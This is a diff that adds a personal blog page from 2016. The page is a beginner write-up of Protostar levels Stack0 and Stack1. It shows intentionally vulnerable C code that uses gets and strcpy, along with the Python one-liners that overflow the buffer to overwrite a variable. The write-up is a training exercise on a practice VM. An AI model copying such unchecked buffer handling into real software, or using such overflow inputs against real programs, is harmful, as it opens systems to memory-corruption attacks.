@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Michael Wang - Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="/css/business-casual.css" rel="stylesheet">
+
+    <!-- Fonts -->
+    <link href="http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Josefin+Slab:100,300,400,600,700,100italic,300italic,400italic,600italic,700italic" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    </head>
+
+    <body>
+
+        <div class="brand">Michael Wang</div>
+        <div class="address-bar">wang.mich@husky.neu.edu | 978-944-3686</div>
+
+        <!-- Navigation -->
+        <nav class="navbar navbar-default" role="navigation">
+            <div class="container">
+                <!-- Brand and toggle get grouped for better mobile display -->
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <!-- navbar-brand is hidden on larger screens, but visible when the menu is collapsed -->
+                    <a class="navbar-brand" href="index.html">Business Casual</a>
+                </div>
+                <!-- Collect the nav links, forms, and other content for toggling -->
+                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                    <ul class="nav navbar-nav">
+                        <li>
+                            <a href="/index.html">Home</a>
+                        </li>
+                        <li>
+                            <a href="/experience.html">Experience</a>
+                        </li>
+                        <li>
+                            <a href="/blog.html">Blog</a>
+                        </li>
+                        <li>
+                            <a href="/projects.html">Projects</a>
+                        </li>
+                    </ul>
+                </div>
+                <!-- /.navbar-collapse -->
+            </div>
+            <!-- /.container -->
+        </nav>
+
+        <div class="container">
+
+            <div class="row">
+            <div class="box">
+                <div class="col-lg-12">
+                    <hr>
+                    <h2 class="intro-text text-center">
+                        <strong>blog</strong>
+                    </h2>
+                    <hr>
+                </div>
+                <div class="col-lg-12 text-center">
+                    <h2>Exploit Exercises(protostar) writeup
+                        <br>
+                        <small>October 26, 2016</small>
+                    </h2>
+                    <div class = "paragraph">
+                    <p>I decided I wanted some practice exploiting C code and buffer overflows. I found a great VM which has quite a few levels.
+                    I'd definitely recommend it, you can check it out <a href="https://exploit-exercises.com/protostar">here</a>.</p>
+                    <div class = "paragraph">
+                        <h3><b><u>Level 1(Stack0)</u></b></h3>
+                        <div class="code">
+                        <p>
+                        int main(int argc, char **argv)<br>
+                        {<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;volatile int modified;<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;char buffer[64];<br>  
+                          &nbsp;&nbsp;&nbsp;&nbsp;modified = 0;<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;gets(buffer);<br>
+                          <br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;if(modified != 0) {<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("you have changed the 'modified' variable\n");<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;} else {<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Try again?\n");<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                        }<br>
+                        </p>
+                        </div>
+                    <p> Here we can simply overwite the modified variable by inputting too many characters. The exact command I used was <i>python -c "print 'A'*65" | ./stack0</i></p>
+                    </div>
+                    <div class = "paragraph">
+                        <h3><b><u>Level 2(Stack1)</u></b></h3>
+                        <div class="code">
+                        <p>
+                        int main(int argc, char **argv)<br>
+                        {<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;volatile int modified;<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;char buffer[64];<br>  
+                          &nbsp;&nbsp;&nbsp;&nbsp;if(argc == 1) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errx(1, "please specify an argument\n");<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;modified = 0;<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;strcpy(buffer, argv[1]);<br>
+                          <br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;if(modified == 0x61626364) {<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("you have correctly got the variable to the right value\n");;<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;} else {<br>
+                              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Try again, you got 0x%08x\n", modified);<br>
+                          &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                        }<br>
+                        </p>
+                        </div>
+                    <p> Here we need to change the variable to 'abcd'. First I tried <br>
+                        <i>./stack1 `python -c "print 'A'*64+abcd"`</i><br>
+                        However, the problem is that x86 is little endian. So, the correct solution is<br>
+                        <i>./stack1 `python -c "print 'A'*64+dcba"`</i>
+                        </p>
+                    </div>
+
+                    <hr>
+                </div>
+            </div>
+            </div>
+
+        </div>
+        <!-- /.container -->
+
+        <footer>
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-12 text-center">
+                        <p>Copyright &copy; Michael Wang 2016</p>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <!-- jQuery -->
+        <script src="js/jquery.js"></script>
+
+        <!-- Bootstrap Core JavaScript -->
+        <script src="js/bootstrap.min.js"></script>
+
+    </body>
+
+    </html>
